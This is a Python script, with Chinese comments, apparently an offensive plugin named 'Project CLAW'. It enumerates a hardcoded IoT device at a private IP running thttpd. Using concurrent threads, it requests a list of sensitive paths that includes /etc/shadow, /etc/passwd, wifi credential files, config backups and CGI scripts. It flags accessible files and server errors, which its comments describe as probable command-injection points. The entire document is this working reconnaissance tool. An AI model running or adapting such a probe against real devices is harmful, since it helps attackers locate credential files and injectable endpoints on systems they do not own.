#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==========================================================
#  Project CLAW 专属插件: IoT 赛博洛阳铲 (Biaze 定制版)
#  目标: 10.130.3.53 (thttpd/2.25b)
# ==========================================================

import urllib.request
import urllib.error
import threading
import time

TARGET_IP = "10.130.3.53"
BASE_URL = f"http://{TARGET_IP}"

# 针对嵌入式 IoT (thttpd) 设备的终极高危字典
IOT_PAYLOADS = [
    # 1. 核心配置与备份 (极速提权)
    "/config.bin", "/backup.bin", "/system.ini", "/conf/system.xml",
    "/etc/passwd", "/etc/shadow", "/wifi.conf", "/wpa_supplicant.conf",
    
    # 2. CGI 脚本重灾区 (极易触发 RCE 命令注入)
    "/cgi-bin/config.sh", "/cgi-bin/upgrade.cgi", "/cgi-bin/reboot.cgi",
    "/cgi-bin/login.cgi", "/cgi-bin/system.cgi", "/cgi-bin/network.cgi",
    "/cgi-bin/test.cgi", "/cgi-bin/ping.cgi", "/cgi-bin/diagnostics.cgi",
    
    # 3. 隐藏的开发/测试 API
    "/api/v1/system", "/api/v1/wifi", "/api/get_info", "/api/set_config",
    "/setup.html", "/admin.html", "/debug.html", "/test.html"
]

print(f"\n\033[1;33m[~] 启动 Project CLAW 赛博洛阳铲 ...\033[0m")
print(f"\033[1;36m[~] 目标锁定: {BASE_URL} (thttpd)\033[0m")
print(f"\033[1;36m[~] 字典规模: {len(IOT_PAYLOADS)} 个 IoT 专属高危指纹\033[0m\n")

def dig_hole(path):
    url = BASE_URL + path
    req = urllib.request.Request(url, headers={'User-Agent': 'CatTeam-Lynx-Probe/5.0'})
    try:
        response = urllib.request.urlopen(req, timeout=3)
        code = response.getcode()
        length = len(response.read())
        # 200 OK 绝对是大鱼！
        if code == 200:
            print(f"\033[1;32m[🎯 致命发现] {code} OK \t| 长度: {length} \t| {url}\033[0m")
    except urllib.error.HTTPError as e:
        # 403 说明文件存在但没权限，这也是极具价值的线索！
        if e.code == 403:
            print(f"\033[1;33m[🔒 权限拦截] {e.code} Forbidden \t| {url}\033[0m")
        # 500 说明 CGI 脚本报错了，极有可能存在参数注入漏洞！
        elif e.code == 500:
            print(f"\033[1;35m[💥 内部崩溃] {e.code} Error \t| 疑似存在注入点: {url}\033[0m")
    except Exception:
        pass

# 启动高并发挖掘
threads = []
for path in IOT_PAYLOADS:
    t = threading.Thread(target=dig_hole, args=(path,))
    threads.append(t)
    t.start()
    time.sleep(0.05) # 稍微喘口气，别把这小破机器打死机了

for t in threads:
    t.join()

print(f"\n\033[1;32m[✓] 深度探测完毕！\033[0m")
